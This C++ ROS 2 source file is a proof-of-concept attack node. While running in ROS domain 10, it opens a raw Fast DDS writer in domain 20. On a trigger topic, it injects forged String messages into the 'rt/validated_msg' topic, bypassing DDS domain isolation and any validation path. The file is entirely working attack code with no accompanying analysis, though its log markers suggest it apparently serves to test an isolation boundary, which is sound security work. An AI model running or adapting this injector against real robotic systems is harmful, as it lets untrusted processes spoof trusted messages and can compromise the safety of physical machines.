#include <fastdds/rtps/RTPSDomain.h>
#include <fastdds/rtps/attributes/HistoryAttributes.h>
#include <fastdds/rtps/attributes/RTPSParticipantAttributes.h>
#include <fastdds/rtps/attributes/WriterAttributes.h>
#include <fastdds/rtps/common/CacheChange.h>
#include <fastdds/rtps/history/WriterHistory.h>
#include <fastdds/rtps/participant/RTPSParticipant.h>
#include <fastdds/rtps/writer/RTPSWriter.h>

#include <fastrtps/attributes/TopicAttributes.h>
#include <fastrtps/qos/WriterQos.h>

#include <rclcpp/rclcpp.hpp>
#include <rclcpp/serialization.hpp>
#include <rclcpp/serialized_message.hpp>
#include <std_msgs/msg/string.hpp>

#include <algorithm>
#include <cstdint>
#include <cstring>
#include <cstdio>
#include <functional>
#include <limits>
#include <memory>
#include <sstream>
#include <stdexcept>
#include <string>
#include <unistd.h>

namespace rtps = eprosima::fastrtps::rtps;
namespace fastrtps = eprosima::fastrtps;
namespace dds = eprosima::fastdds::dds;

namespace
{
constexpr uint32_t ATTACK_DOMAIN_ID = 20;
constexpr const char* TARGET_DDS_TOPIC = "rt/validated_msg";

// Verified from the already working ROS 2 Jazzy + rmw_fastrtps_cpp writer discovery log.
constexpr const char* TARGET_DDS_TYPE = "std_msgs::msg::dds_::String_";

constexpr uint32_t PAYLOAD_MAX_SIZE = 64u * 1024u;
constexpr int32_t INITIAL_HISTORY_CACHES = 8;
}

class DirectD20Writer
{
public:
    ~DirectD20Writer()
    {
        cleanup();
    }

    bool init()
    {
        rtps::RTPSParticipantAttributes participant_attrs;
        participant_attrs.setName("untrusted_fastdds_d20_bypass");

        participant_ = rtps::RTPSDomain::createParticipant(
            ATTACK_DOMAIN_ID,
            participant_attrs,
            nullptr);

        if (participant_ == nullptr)
        {
            return false;
        }

        rtps::HistoryAttributes history_attrs;
        history_attrs.payloadMaxSize = PAYLOAD_MAX_SIZE;
        history_attrs.initialReservedCaches = INITIAL_HISTORY_CACHES;
        history_attrs.maximumReservedCaches = 0;

        history_ = std::make_unique<rtps::WriterHistory>(history_attrs);

        rtps::WriterAttributes writer_attrs;
        writer_attrs.endpoint.reliabilityKind = rtps::RELIABLE;
        writer_attrs.endpoint.durabilityKind = rtps::VOLATILE;
        writer_attrs.endpoint.topicKind = rtps::NO_KEY;
        writer_attrs.mode = rtps::ASYNCHRONOUS_WRITER;

        writer_ = rtps::RTPSDomain::createRTPSWriter(
            participant_,
            writer_attrs,
            history_.get(),
            nullptr);

        if (writer_ == nullptr)
        {
            return false;
        }

        fastrtps::TopicAttributes topic(
            TARGET_DDS_TOPIC,
            TARGET_DDS_TYPE,
            rtps::NO_KEY);
        topic.auto_fill_type_object = false;
        topic.auto_fill_type_information = false;

        fastrtps::WriterQos writer_qos;
        writer_qos.m_reliability.kind = dds::RELIABLE_RELIABILITY_QOS;
        writer_qos.m_durability.kind = dds::VOLATILE_DURABILITY_QOS;

        if (!participant_->registerWriter(writer_, topic, writer_qos))
        {
            return false;
        }

        return true;
    }

    bool send_serialized_ros_string(const std::string& text)
    {
        if (writer_ == nullptr || history_ == nullptr)
        {
            return false;
        }

        std_msgs::msg::String message;
        message.data = text;

        rclcpp::SerializedMessage serialized_message;
        serializer_.serialize_message(&message, &serialized_message);

        const auto& rcl_serialized =
            serialized_message.get_rcl_serialized_message();

        if (rcl_serialized.buffer == nullptr ||
            rcl_serialized.buffer_length == 0 ||
            rcl_serialized.buffer_length > std::numeric_limits<uint32_t>::max())
        {
            return false;
        }

        const uint32_t payload_length =
            static_cast<uint32_t>(rcl_serialized.buffer_length);

        std::function<uint32_t()> size_provider = [payload_length]()
        {
            return payload_length;
        };

        rtps::CacheChange_t* change = writer_->new_change(
            size_provider,
            rtps::ALIVE);

        if (change == nullptr)
        {
            return false;
        }

        if (change->serializedPayload.data == nullptr ||
            change->serializedPayload.max_size < payload_length)
        {
            writer_->release_change(change);
            return false;
        }

        std::memcpy(
            change->serializedPayload.data,
            rcl_serialized.buffer,
            payload_length);

        change->serializedPayload.length = payload_length;
        change->serializedPayload.pos = 0;

        // rmw_fastrtps serialized ROS 2 messages contain the 4-byte CDR
        // representation header at the beginning of the serialized buffer.
        // Keep Fast DDS' separate encapsulation field consistent with it.
        if (payload_length >= 2)
        {
            change->serializedPayload.encapsulation =
                static_cast<uint16_t>(
                    (static_cast<uint16_t>(rcl_serialized.buffer[0]) << 8u) |
                    static_cast<uint16_t>(rcl_serialized.buffer[1]));
        }

        if (!history_->add_change(change))
        {
            writer_->release_change(change);
            return false;
        }

        return true;
    }

    std::string writer_guid_string() const
    {
        std::ostringstream out;
        out << writer_->getGuid();
        return out.str();
    }

private:
    void cleanup()
    {
        // Do NOT call RTPSDomain::stopAll() here: this process also owns the
        // ROS 2/rmw_fastrtps participant created by rclcpp.
        if (writer_ != nullptr)
        {
            rtps::RTPSDomain::removeRTPSWriter(writer_);
            writer_ = nullptr;
        }

        history_.reset();

        if (participant_ != nullptr)
        {
            rtps::RTPSDomain::removeRTPSParticipant(participant_);
            participant_ = nullptr;
        }
    }

private:
    rtps::RTPSParticipant* participant_{nullptr};
    rtps::RTPSWriter* writer_{nullptr};
    std::unique_ptr<rtps::WriterHistory> history_;
    rclcpp::Serialization<std_msgs::msg::String> serializer_;
};

class FastDdsD20BypassNode final : public rclcpp::Node
{
public:
    FastDdsD20BypassNode()
        : Node("fastdds_d20_bypass_node")
    {
        if (!direct_writer_.init())
        {
            throw std::runtime_error("failed to create direct Fast DDS Domain 20 writer");
        }

        trigger_sub_ = create_subscription<std_msgs::msg::String>(
            "/attack_d20",
            rclcpp::QoS(10).reliable(),
            [this](const std_msgs::msg::String::SharedPtr msg)
            {
                const std::string payload =
                    "FAST_DDS_D20_BYPASS:" + msg->data;

                RCLCPP_WARN(
                    get_logger(),
                    "DIRECT_D20_WRITE_ATTEMPT pid=%d payload=%s",
                    static_cast<int>(::getpid()),
                    payload.c_str());

                const bool queued =
                    direct_writer_.send_serialized_ros_string(payload);

                RCLCPP_WARN(
                    get_logger(),
                    "DIRECT_D20_WRITE_RESULT queued_to_writer_history=%s",
                    queued ? "true" : "false");
            });

        const std::string writer_guid = direct_writer_.writer_guid_string();

        RCLCPP_WARN(
            get_logger(),
            "FAST_DDS_D20_BYPASS_READY pid=%d attack_domain=%u topic=%s writer_guid=%s",
            static_cast<int>(::getpid()),
            ATTACK_DOMAIN_ID,
            TARGET_DDS_TOPIC,
            writer_guid.c_str());

        RCLCPP_WARN(
            get_logger(),
            "Run this process with ROS_DOMAIN_ID=10. Trigger with /attack_d20 in D10.");
    }

private:
    DirectD20Writer direct_writer_;
    rclcpp::Subscription<std_msgs::msg::String>::SharedPtr trigger_sub_;
};

int main(int argc, char** argv)
{
    rclcpp::init(argc, argv);

    try
    {
        rclcpp::spin(std::make_shared<FastDdsD20BypassNode>());
    }
    catch (const std::exception& e)
    {
        std::fprintf(stderr, "[FATAL] %s\n", e.what());
        rclcpp::shutdown();
        return 1;
    }

    rclcpp::shutdown();
    return 0;
}
